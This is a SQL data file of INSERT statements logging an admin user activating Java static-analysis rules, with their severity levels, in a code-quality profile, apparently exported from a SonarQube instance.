INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1082, '2017-11-20 07:41:45.308', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2326;ruleKey=squid:S2326;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDfcbbGRdfPp-qud');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1083, '2017-11-20 07:41:45.347', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2386;ruleKey=squid:S2386;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDgDbbGRdfPp-que');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1084, '2017-11-20 07:41:45.379', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2387;ruleKey=squid:S2387;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDgjbbGRdfPp-quf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1085, '2017-11-20 07:41:45.411', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2388;ruleKey=squid:S2388;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDhDbbGRdfPp-qug');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1086, '2017-11-20 07:41:45.448', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2390;ruleKey=squid:S2390;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDhobbGRdfPp-quh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1087, '2017-11-20 07:41:45.491', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2391;ruleKey=squid:S2391;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDiTbbGRdfPp-qui');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1088, '2017-11-20 07:41:45.531', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2437;ruleKey=squid:S2437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDi7bbGRdfPp-quj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1089, '2017-11-20 07:41:45.583', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2438;ruleKey=squid:S2438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDjvbbGRdfPp-quk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1090, '2017-11-20 07:41:45.632', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2440;ruleKey=squid:S2440;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDkgbbGRdfPp-qul');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1091, '2017-11-20 07:41:45.669', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2441;ruleKey=squid:S2441;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDlFbbGRdfPp-qum');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1092, '2017-11-20 07:41:45.71', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2442;ruleKey=squid:S2442;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDlubbGRdfPp-qun');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1093, '2017-11-20 07:41:45.748', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2445;ruleKey=squid:S2445;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDmUbbGRdfPp-quo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1094, '2017-11-20 07:41:45.778', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2446;ruleKey=squid:S2446;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDmybbGRdfPp-qup');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1095, '2017-11-20 07:41:45.834', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2447;ruleKey=squid:S2447;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDnqbbGRdfPp-quq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1096, '2017-11-20 07:41:45.904', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2583;ruleKey=squid:S2583;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDowbbGRdfPp-qur');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1097, '2017-11-20 07:41:46.02', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2589;ruleKey=squid:S2589;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDqkbbGRdfPp-qus');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1098, '2017-11-20 07:41:46.178', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2629;ruleKey=squid:S2629;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDtCbbGRdfPp-qut');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1099, '2017-11-20 07:41:46.237', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2637;ruleKey=squid:S2637;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDt9bbGRdfPp-quu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1100, '2017-11-20 07:41:46.28', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2638;ruleKey=squid:S2638;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDuobbGRdfPp-quv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1101, '2017-11-20 07:41:46.326', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2639;ruleKey=squid:S2639;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDvWbbGRdfPp-quw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1102, '2017-11-20 07:41:46.372', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2653;ruleKey=squid:S2653;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDwEbbGRdfPp-qux');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1103, '2017-11-20 07:41:46.412', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2674;ruleKey=squid:S2674;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDwsbbGRdfPp-quy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1104, '2017-11-20 07:41:46.454', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2675;ruleKey=squid:S2675;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDxWbbGRdfPp-quz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1105, '2017-11-20 07:41:46.496', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2676;ruleKey=squid:S2676;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDyAbbGRdfPp-qu0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1106, '2017-11-20 07:41:46.525', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2677;ruleKey=squid:S2677;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDydbbGRdfPp-qu1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1107, '2017-11-20 07:41:46.551', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2681;ruleKey=squid:S2681;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDy3bbGRdfPp-qu2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1108, '2017-11-20 07:41:46.592', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2692;ruleKey=squid:S2692;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYDzgbbGRdfPp-qu3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1109, '2017-11-20 07:41:46.639', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2695;ruleKey=squid:S2695;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD0PbbGRdfPp-qu4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1110, '2017-11-20 07:41:46.678', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2696;ruleKey=squid:S2696;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD02bbGRdfPp-qu5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1111, '2017-11-20 07:41:46.715', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2718;ruleKey=squid:S2718;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD1bbbGRdfPp-qu6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1112, '2017-11-20 07:41:46.744', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2737;ruleKey=squid:S2737;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD14bbGRdfPp-qu7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1113, '2017-11-20 07:41:46.785', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2757;ruleKey=squid:S2757;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD2gbbGRdfPp-qu8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1114, '2017-11-20 07:41:46.833', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2786;ruleKey=squid:S2786;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD3RbbGRdfPp-qu9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1115, '2017-11-20 07:41:46.925', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2789;ruleKey=squid:S2789;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD4tbbGRdfPp-qu-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1116, '2017-11-20 07:41:46.991', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2864;ruleKey=squid:S2864;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD5vbbGRdfPp-qu_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1117, '2017-11-20 07:41:47.058', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2885;ruleKey=squid:S2885;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD6ybbGRdfPp-qvA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1118, '2017-11-20 07:41:47.097', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2886;ruleKey=squid:S2886;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD7ZbbGRdfPp-qvB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1119, '2017-11-20 07:41:47.136', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2912;ruleKey=squid:S2912;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD8AbbGRdfPp-qvC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1120, '2017-11-20 07:41:47.167', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2924;ruleKey=squid:S2924;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD8fbbGRdfPp-qvD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1121, '2017-11-20 07:41:47.203', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2925;ruleKey=squid:S2925;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD9DbbGRdfPp-qvE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1122, '2017-11-20 07:41:47.242', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2970;ruleKey=squid:S2970;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD9qbbGRdfPp-qvF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1123, '2017-11-20 07:41:47.282', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2975;ruleKey=squid:S2975;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD-SbbGRdfPp-qvG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1124, '2017-11-20 07:41:47.327', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S2976;ruleKey=squid:S2976;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD-_bbGRdfPp-qvH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1125, '2017-11-20 07:41:47.368', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3008;ruleKey=squid:S3008;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYD_obbGRdfPp-qvI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1126, '2017-11-20 07:41:47.4', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3010;ruleKey=squid:S3010;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEAIbbGRdfPp-qvJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1127, '2017-11-20 07:41:47.434', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3020;ruleKey=squid:S3020;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEAqbbGRdfPp-qvK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1128, '2017-11-20 07:41:47.471', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3027;ruleKey=squid:S3027;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEBPbbGRdfPp-qvL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1129, '2017-11-20 07:41:47.511', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3034;ruleKey=squid:S3034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEB3bbGRdfPp-qvM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1130, '2017-11-20 07:41:47.548', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3038;ruleKey=squid:S3038;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYECcbbGRdfPp-qvN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1131, '2017-11-20 07:41:47.591', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3042;ruleKey=squid:S3042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEDHbbGRdfPp-qvO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1132, '2017-11-20 07:41:47.629', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3046;ruleKey=squid:S3046;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEDtbbGRdfPp-qvP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1133, '2017-11-20 07:41:47.693', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3066;ruleKey=squid:S3066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEEtbbGRdfPp-qvQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1134, '2017-11-20 07:41:47.732', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3067;ruleKey=squid:S3067;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEFUbbGRdfPp-qvR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1135, '2017-11-20 07:41:47.77', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3281;ruleKey=squid:S3281;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEF6bbGRdfPp-qvS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1136, '2017-11-20 07:41:47.813', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3346;ruleKey=squid:S3346;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEGlbbGRdfPp-qvT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1137, '2017-11-20 07:41:47.88', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3355;ruleKey=squid:S3355;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEHobbGRdfPp-qvU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1138, '2017-11-20 07:41:47.948', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3358;ruleKey=squid:S3358;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEIsbbGRdfPp-qvV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1139, '2017-11-20 07:41:48.054', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3398;ruleKey=squid:S3398;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEKWbbGRdfPp-qvW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1140, '2017-11-20 07:41:48.091', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3400;ruleKey=squid:S3400;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEK7bbGRdfPp-qvX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1141, '2017-11-20 07:41:48.131', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3415;ruleKey=squid:S3415;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYELjbbGRdfPp-qvY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1142, '2017-11-20 07:41:48.163', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3421;ruleKey=squid:S3421;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEMDbbGRdfPp-qvZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1143, '2017-11-20 07:41:48.207', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3422;ruleKey=squid:S3422;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYEMvbbGRdfPp-qva');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1144, '2017-11-20 07:41:48.239', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S3436;ruleKey=squid:S3436;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYENPbbGRdfPp-qvb');
